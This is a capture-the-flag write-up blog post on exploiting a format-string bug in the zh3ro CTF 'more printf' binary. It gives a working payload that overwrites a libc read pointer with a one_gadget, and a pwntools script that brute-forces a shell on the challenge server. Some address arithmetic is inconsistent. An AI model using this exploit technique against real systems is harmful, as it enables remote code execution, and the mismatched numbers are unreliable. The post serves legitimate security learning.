<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>zh3ro CTF - more printf (pwn) | a rant of my adventures</title>
<meta property="og:title" content="zh3ro CTF - more printf (pwn) | a rant of my adventures"><meta name=twitter:title content="zh3ro CTF - more printf (pwn) | a rant of my adventures"><meta itemprop=name content="zh3ro CTF - more printf (pwn) | a rant of my adventures"><meta name=application-name content="zh3ro CTF - more printf (pwn) | a rant of my adventures"><meta property="og:site_name" content="a rant of my adventures"><meta name=description content="write-what-where, fsb"><meta itemprop=description content="write-what-where, fsb"><meta property="og:description" content="write-what-where, fsb"><meta name=twitter:description content="write-what-where, fsb"><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><meta itemprop=image content="https://blog.caprinux.com"><meta property="og:image" content="https://blog.caprinux.com"><meta name=twitter:image content="https://blog.caprinux.com"><meta name=twitter:image:src content="https://blog.caprinux.com"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2021-06-07T00:00:00Z"><meta property="article:published_time" content="2021-06-07T00:00:00Z"><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"zh3ro CTF - more printf (pwn)","author":{"@type":"Person","name":""},"datePublished":"2021-06-07","description":"write-what-where, fsb","wordCount":1360,"mainEntityOfPage":"True","dateModified":"2021-06-07","image":{"@type":"imageObject","url":""},"publisher":{"@type":"Organization","name":"a rant of my adventures"}}</script><meta name=generator content="Hugo 0.121.1"><link rel=canonical href=https://blog.caprinux.com/posts/ctfs/2021/zh3ro-more-printf/><link href=/style.min.5d415e34e927589b6ad5fe83ea6f8006479d2d6c2fa7897ee14c54c5618ba634.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://blog.caprinux.com/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><link rel=icon type=image/svg+xml href=/icons/favicon.svg></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><meta http-equiv=cache-control content="max-age=0"><meta http-equiv=cache-control content="no-cache"><meta http-equiv=expires content="0"><meta http-equiv=expires content="Tue, 01 Jan 1980 1:00:00 GMT"><meta http-equiv=pragma content="no-cache"><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://blog.caprinux.com/ class=logo><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></a><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/pages/about/>About</a></li><li class=menu-separator><span></span></li></ul><a id=mode href=#><svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>zh3ro CTF - more printf (pwn)</h1><div class=post-meta><time datetime=2021-06-07T00:00:00+00:00 itemprop=datePublished>7 Jun 2021</time></div></header><details class=toc open><summary><b>Table of Contents</b></summary><nav id=TableOfContents><ul><li><a href=#challenge-description>Challenge Description</a></li><li><a href=#overview>Overview</a></li><li><a href=#thought-process>Thought Process</a></li><li><a href=#post-ctf-exploitation>Post-CTF exploitation</a></li></ul></nav></details><div class=page-content><h2 id=challenge-description>Challenge Description</h2><hr><blockquote><p>printf();</p><p>nc pwn.zh3r0.cf 2222</p><p>Attached: <a href=attachments/more-printf.tar.gz>printf.tar.gz</a></p><p>Author - hk</p></blockquote><h2 id=overview>Overview</h2><hr><p>Extracting the tar archive, we are provided with a binary, the source code, and libc-2.27.so.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* gcc -o more-printf -fstack-protector-all more-printf.c */</span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=n>FILE</span> <span class=o>*</span><span class=n>fp</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mh>0x8d9e7e558877</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>_Noreturn</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* Just to save some of your time */</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=o>*</span><span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>p</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* Chall */</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>buffer</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x20</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;/dev/null&#34;</span><span class=p>,</span> <span class=s>&#34;wb&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=mh>0x1f</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>!=</span> <span class=mh>0x8d9e7e558877</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>_exit</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>1337</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>_exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Checking the security of the binary, we see that we have every protection enabled except for a stack canary.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cs data-lang=cs><span class=line><span class=cl><span class=na>[*]</span> <span class=err>&#39;</span><span class=p>/</span><span class=n>home</span><span class=p>/</span><span class=n>elma</span><span class=p>/</span><span class=n>Playground</span><span class=p>/</span><span class=n>more</span><span class=p>-</span><span class=n>printf</span><span class=p>/</span><span class=n>more</span><span class=p>-</span><span class=n>printf</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>Arch</span><span class=p>:</span>     <span class=n>amd64</span><span class=p>-</span><span class=m>64</span><span class=p>-</span><span class=n>little</span>
</span></span><span class=line><span class=cl>    <span class=n>RELRO</span><span class=p>:</span>    <span class=n>Full</span> <span class=n>RELRO</span>
</span></span><span class=line><span class=cl>    <span class=n>Stack</span><span class=p>:</span>    <span class=n>No</span> <span class=n>canary</span> <span class=n>found</span>
</span></span><span class=line><span class=cl>    <span class=n>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
</span></span><span class=line><span class=cl>    <span class=n>PIE</span><span class=p>:</span>      <span class=n>PIE</span> <span class=n>enabled</span>
</span></span><span class=line><span class=cl>    <span class=n>RUNPATH</span><span class=p>:</span>  <span class=n>b</span><span class=err>&#39;</span><span class=p>./</span><span class=err>&#39;</span>
</span></span></code></pre></div><p>Let&rsquo;s dive right into it.</p><h2 id=thought-process>Thought Process</h2><hr><p>Few minutes into the binary and we already have a few issues on our hands</p><ol><li>We are only provided with a single input which is sent to <code>/dev/null</code>. This means that we are unable to leak any output which makes it rather tricky.</li><li>Our input is sent to the heap which prevents us from referencing back to our own input in our format string attacks.</li><li>There is a &lsquo;canary&rsquo; <code>i</code> which prevents us from easily looping to <code>main()</code> and getting another printf.</li><li><code>FULL RELRO</code> is enabled which means that we are unable to overwrite any <code>GOT</code> data and any attempts to do so will be met with a <code>SIGSEGV</code>.</li></ol><p>If we look at the disassembly of <code>fprintf</code>, we can see that we want to break at <code>_IO_vfprintf_internal</code> which is <code>fprintf+143</code>. Hence, let&rsquo;s set a breakpoint there.</p><p>Here is what the stack frame looks at <code>fprintf+143</code>.</p><p><img src=attachments/moreprintfstackframe.png alt=image></p><p>As you can see, our return address is at <code>0x7fffffffd7d8 —▸ 0x5555555552af (main+198)</code></p><p>Let&rsquo;s look at what format string offsets we can control by changing <code>fprintf</code> output to <code>stdout</code> which outputs the format strings.</p><p>We can do this with <code>set $rdi=(void*)stdout</code></p><p>We continue to the next instruction, and we see that we have the following values:</p><pre tabindex=0><code>0x55555555d260,0x7ffff7af4191,0x7ffff7dd18c0,0x7ffff7ff5540,0x7fffffffd7b0,0x8663804b612c7c00,0x5555555552c0,0x7ffff7a05b97,0x2000000000
</code></pre><p>which corresponds to</p><pre tabindex=0><code>06:0030│         0x7fffffffd700 —▸ 0x55555555d260 ◂— &#39;%p,%p,%p,%p,%p,%p,%p,%p,%p\n&#39;
07:0038│         0x7fffffffd708 —▸ 0x7ffff7af4191 (read+17) ◂— cmp    rax, -0x1000 /* &#39;H=&#39; */
08:0040│         0x7fffffffd710 —▸ 0x7ffff7dd18c0 ◂— 0x0
09:0048│         0x7fffffffd718 —▸ 0x7ffff7ff5540 ◂— 0x7ffff7ff5540
...
1c:00e0│         0x7fffffffd7b0 ◂— 0x7fffffffd7b0
1d:00e8│         0x7fffffffd7b8 ◂— 0x8663804b612c7c00
1e:00f0│ rbp     0x7fffffffd7c0 —▸ 0x5555555552c0 (__libc_csu_init) ◂— endbr64
1f:00f8│         0x7fffffffd7c8 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
20:0100│         0x7fffffffd7d0 ◂— 0x2000000000
</code></pre><p>The only saving grace of this whole situation is the <code>p = &amp;p</code>, which is in the stack at <code>1c</code>.</p><p>Since we have control over it on our FSB, we are able to use it to modify stuff on our stack and bypass <code>FULL RELRO</code>.</p><p>It is also important to note that we are only able to use one positional argument to modify values on the stack.</p><blockquote><p>fprintf will call vfprintf internally. When vfprintf encounters the first positional parameter $ it copies all needed argument to an internal buffer, on the next positional parameter $, it will fetch the original value which was there instead of the changed value.</p></blockquote><p>Now we have all the pieces laid on the table for us, I considered the following techniques</p><ul><li>We could probably loop back to main to allow us to obtain more writes and easily solve the challenge from there.</li></ul><p>However, we quickly noticed that our <code>i</code> canary was stored in the <code>bss</code> segment which address is randomized. This means we are unable to fix the <code>i</code> canary to return to main.</p><ul><li>Since our <code>i</code> canary only prevents us from calling fprintf a second time, I considered modifying nibbles of some libc addresses into one_gadget addresses and returning to main to call it (i.e. fgets, read etc.)</li></ul><p>However, after some trying, I noticed that I will need to reuse <code>p = &amp;p</code> since <code>RELRO</code> is enabled and I have to modify <code>read()</code> and our return address.</p><p>At this point, we had ideas all over the place <em>(in fact the answer was in our face but my ubuntu just keeps farting)</em> that we didn&rsquo;t manage to piece together in time.</p><h2 id=post-ctf-exploitation>Post-CTF exploitation</h2><hr><p>Before we continue, it is important to understand the internal structures of printf.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>┌──────────────────────────┐ ┌───────────────────────────┐
</span></span><span class=line><span class=cl>│                          │ │                           │
</span></span><span class=line><span class=cl>│                          │ │                           │
</span></span><span class=line><span class=cl>│                          │ │                           │
</span></span><span class=line><span class=cl>│   fprintf(fp, buffer);   │ │         exit(1);          │
</span></span><span class=line><span class=cl>│                          │ │                           │
</span></span><span class=line><span class=cl>│                          │ │                           │
</span></span><span class=line><span class=cl>└─────────────┬────────────┘ └─────────────▲─────────────┘
</span></span><span class=line><span class=cl>              │                            │  return
</span></span><span class=line><span class=cl>┌─────────────▼────────────┐ ┌─────────────┴─────────────┐
</span></span><span class=line><span class=cl>│                          │ │                           │
</span></span><span class=line><span class=cl>│                          │ │                           │
</span></span><span class=line><span class=cl>│         vfprintf()       │ │        fprintf()          │
</span></span><span class=line><span class=cl>│                          │ │                           │
</span></span><span class=line><span class=cl>│                          │ │                           │
</span></span><span class=line><span class=cl>└─────────────┬────────────┘ └─────────────▲─────────────┘
</span></span><span class=line><span class=cl>              │                            │
</span></span><span class=line><span class=cl>┌─────────────▼────────────┐               │
</span></span><span class=line><span class=cl>│                          │               │
</span></span><span class=line><span class=cl>│                          │               │
</span></span><span class=line><span class=cl>│         read()           ├───────────────┘
</span></span><span class=line><span class=cl>│                          │
</span></span><span class=line><span class=cl>│                          │
</span></span><span class=line><span class=cl>└──────────────────────────┘
</span></span></code></pre></div><p><code>read</code> is actually called during the execution of fprintf. This is a whole game-changer for us because remember in our previous collation of ideas, we mentioned modifying a libc address into a <code>one_gadget</code> and call it by returning to main.</p><p>In fact, we can modify <code>read</code> and we don&rsquo;t even need to return to main.</p><p>However, that&rsquo;s not enough. In order to be able to modify read into a <code>one_gadget</code> address, we will use the field width operator <code>*</code>.</p><blockquote><p>Use * to have a variable field width, equals to an signed integer on the stack, can combine with positional argument. Eg. %*10$c: print a number of characters equals to the 10th argument.</p></blockquote><p>Consider the stack frame again.</p><p><img src=attachments/moreprintfstackframe.png alt=image></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mo>07</span><span class=o>:</span><span class=mo>003</span><span class=mi>8</span><span class=err>│</span>         <span class=mh>0x7fffffffd708</span> <span class=err>—▸</span> <span class=mh>0x7ffff7af4191</span> <span class=p>(</span><span class=n>read</span><span class=o>+</span><span class=mi>17</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=nl>c</span><span class=p>:</span><span class=mf>00e0</span><span class=err>│</span>         <span class=mh>0x7fffffffd7b0</span> <span class=err>◂—</span> <span class=mh>0x7fffffffd7b0</span> <span class=err>\\</span> <span class=n>p</span><span class=o>=&amp;</span><span class=n>p</span>
</span></span></code></pre></div><p>We first modify our <code>p = &amp;p</code> to point at <code>0x7fffffffd708</code>. Since we can only use one positional argument, we will pad our format string with <code>%c</code> until we reach the 5th argument which is our offset to <code>p = &amp;p</code> on the stack.</p><p>We want to modify the lower bits from <code>b0</code> -> <code>08</code>. We will use <code>%hhn</code> which only modifies the last byte of the address.</p><p>After playing round a little bit, <code>%c%c%c%5c%hhn</code> will point <code>p</code> to <code>read+ 17</code>.</p><p>This is our new stack frame after modification.</p><p><img src=attachments/moreprintfstackframe2.png alt=image></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mo>07</span><span class=o>:</span><span class=mo>003</span><span class=mi>8</span><span class=err>│</span>     <span class=mh>0x7fffffffd708</span> <span class=err>—▸</span> <span class=mh>0x7ffff7af4191</span> <span class=p>(</span><span class=n>read</span><span class=o>+</span><span class=mi>17</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=nl>c</span><span class=p>:</span><span class=mf>00e0</span><span class=err>│</span>     <span class=mh>0x7fffffffd7b0</span> <span class=err>—▸</span> <span class=mh>0x7fffffffd708</span> <span class=err>—▸</span> <span class=mh>0x7ffff7af4191</span> <span class=p>(</span><span class=n>read</span><span class=o>+</span><span class=mi>17</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mf>1f</span><span class=o>:</span><span class=mf>00f</span><span class=mi>8</span><span class=err>│</span>     <span class=mh>0x7fffffffd7c8</span> <span class=err>—▸</span> <span class=mh>0x7ffff7a05b97</span> <span class=p>(</span><span class=n>__libc_start_main</span><span class=o>+</span><span class=mi>231</span><span class=p>)</span>
</span></span></code></pre></div><p>Now that we have successfully pointed <code>p</code> to <code>read</code>, we can modify <code>read</code>.</p><p>We can use the address of <code>__libc_start_main+231</code> which is at our 8th offset, and add an offset to it to turn it into a <code>one_gadget</code> address.</p><p>Let&rsquo;s calculate our offset from <code>__libc_start_main+231</code> to <code>one_gadget</code>.</p><p>First, we find our one_gadget offset from libc base.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cs data-lang=cs><span class=line><span class=cl><span class=m>0x4f365</span> <span class=n>execve</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=n>rsp</span><span class=p>+</span><span class=m>0x40</span><span class=p>,</span> <span class=n>environ</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>constraints</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>rsp</span> <span class=p>&amp;</span> <span class=m>0xf</span> <span class=p>==</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>  <span class=n>rcx</span> <span class=p>==</span> <span class=n>NULL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0x4f3c2</span> <span class=n>execve</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=n>rsp</span><span class=p>+</span><span class=m>0x40</span><span class=p>,</span> <span class=n>environ</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>constraints</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=na>  [rsp+0x40]</span> <span class=p>==</span> <span class=n>NULL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0x10a45c</span> <span class=n>execve</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=n>rsp</span><span class=p>+</span><span class=m>0x70</span><span class=p>,</span> <span class=n>environ</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>constraints</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=na>  [rsp+0x70]</span> <span class=p>==</span> <span class=n>NULL</span>
</span></span></code></pre></div><p>Using <code>vmmap</code> in gdb, we can obtain our libc base address.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>_libc_start_main_ret</span> <span class=o>=</span> <span class=mh>0x00007ffff7a03bf7</span>
</span></span><span class=line><span class=cl><span class=n>_libc_base</span> <span class=o>=</span> <span class=mh>0x00007ffff79e2000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=n>_libc_base</span> <span class=o>+</span> <span class=mh>0x4f3d5</span> <span class=o>=</span> <span class=mh>0x00007fff08629be7</span>
</span></span><span class=line><span class=cl><span class=n>diff</span> <span class=o>=</span> <span class=n>one_gadget</span> <span class=o>-</span> <span class=n>_libc_start_main_ret</span> <span class=o>=</span> <span class=mi>186334</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># since we have already written %c%c%c%5c = 8 bytes, we just have to write</span>
</span></span><span class=line><span class=cl><span class=mi>186334</span> <span class=o>-</span> <span class=mi>8</span> <span class=o>=</span> <span class=mi>186326</span> <span class=c1># bytes more.</span>
</span></span></code></pre></div><p>Here is what our second payload will consist of :</p><ol><li><code>%*8$c</code> : prints number of characters equals to its address <code>0x7ffff7a05b97</code></li><li><code>%186326c</code> : adds offset to one_gadget</li><li><code>%5$n</code> : overwrites address of read to number of bytes written before it.</li></ol><p>Hence, putting our payloads together, we have</p><p><code>%c%c%c%5c%hhn%*8$c%186326c%5$n</code></p><p>which modifies our pointer to <code>read</code> and modifies <code>read</code> address to <code>one_gadget</code>.</p><p>However, since our second <code>%n</code> modifies all 8 bytes of the address and only the last 3 nibbles of libc address is deterministic, there is only a <code>1 in 32</code> chance of obtaining our shell. Hence we can write a script for this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>warnings</span> <span class=kn>import</span> <span class=n>filterwarnings</span> <span class=k>as</span> <span class=n>fw</span>
</span></span><span class=line><span class=cl><span class=n>fw</span><span class=p>(</span><span class=s1>&#39;ignore&#39;</span><span class=p>,</span> <span class=n>category</span><span class=o>=</span><span class=ne>BytesWarning</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>counter</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;brute forcing to shell&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>pro</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># p = process(&#39;./more-printf&#39;)</span>
</span></span><span class=line><span class=cl>            <span class=k>with</span> <span class=n>context</span><span class=o>.</span><span class=n>quiet</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwn.zh3r0.cf&#39;</span><span class=p>,</span> <span class=mi>2222</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>%c%c%c%5c</span><span class=s1>%hhn%*8$c</span><span class=si>%186326c</span><span class=s1>%5$n&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;cat flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;enjoy your shell :)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>counter</span> <span class=o>=</span> <span class=n>counter</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>pro</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>counter</span><span class=si>}</span><span class=s2> tries&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span></code></pre></div><p>Let&rsquo;s watch this in action!</p><script id=asciicast-RiYbbwWBq8NklbFMQkXTSyRFi src=https://asciinema.org/a/RiYbbwWBq8NklbFMQkXTSyRFi.js async></script><hr><p><sub><sup><em>*note:</em> some of my values may change halfway through the writeup due to an issue with my binary but the concept reamins unchanged!</p><p><em>credits to <a href=https://violenttestpen.github.io/>violenttestpen</a> for going through some of these concepts and teaching me some FSB hacks hehe his writeup is <a href=https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/>here</a></em></sup></sub></p></div></article><hr style=margin-top:40px;margin-bottom:40px><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//caprinux.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/caprinux target=_blank rel="noopener noreferrer me" title=Github><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://x.com/elma_ios target=_blank rel="noopener noreferrer me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a 